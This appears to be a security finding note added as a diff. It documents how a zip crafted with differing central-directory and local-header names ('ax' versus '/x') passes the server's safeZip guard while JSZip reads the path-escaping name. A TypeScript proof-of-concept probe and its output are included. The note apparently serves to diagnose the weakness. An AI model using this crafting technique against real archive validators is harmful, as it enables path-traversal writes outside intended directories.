@@ -1,0 +1,38 @@
+# How a zip entry named /x reached the reader past safeZip. 2026-11-02T04:13:20Z
+# safeZip (assertZipWithinLimits) reads each name from the central directory; JSZip names each entry from its local header.
+# Probe: npx tsx localname-probe.mts (below). Output:
+
+plain zip, /x in both headers
+  safeZip: refused: This file is a compressed archive the server will not open: it names a file outs
+  JSZip names: ["/x"]
+crafted zip, central "ax", local "/x"
+  safeZip: passed
+  JSZip names: ["/x"]
+
+# The probe:
+    import { createRequire } from 'module';
+    const JSZip = createRequire('/home/user/ClinicalSageAI-2-replit/package.json')('jszip');
+    import { assertZipWithinLimits } from '/home/user/ClinicalSageAI-2-replit/server/services/archive/safeZip';
+    
+    async function build(name: string): Promise<Buffer> {
+      const z = new JSZip();
+      z.file(name, 'x');
+      return z.generateAsync({ type: 'nodebuffer', compression: 'STORE' });
+    }
+    const verdict = async (label: string, buf: Buffer) => {
+      let guard = 'passed';
+      try { await assertZipWithinLimits(buf as never); } catch (e) { guard = `refused: ${(e as Error).message.slice(0, 80)}`; }
+      const names = Object.keys((await JSZip.loadAsync(buf)).files);
+      console.log(`${label}\n  safeZip: ${guard}\n  JSZip names: ${JSON.stringify(names)}`);
+    };
+    
+    const plain = await build('/x');
+    await verdict('plain zip, /x in both headers', plain);
+    
+    // Same length names: 'ax' in the central directory, '/x' in the local header.
+    const crafted = await build('ax');
+    const local = crafted.indexOf(Buffer.from([0x50, 0x4b, 0x03, 0x04]));
+    const nameAt = local + 30;
+    if (crafted.toString('latin1', nameAt, nameAt + 2) !== 'ax') throw new Error('layout');
+    crafted.write('/x', nameAt, 'latin1');
+    await verdict('crafted zip, central "ax", local "/x"', crafted);
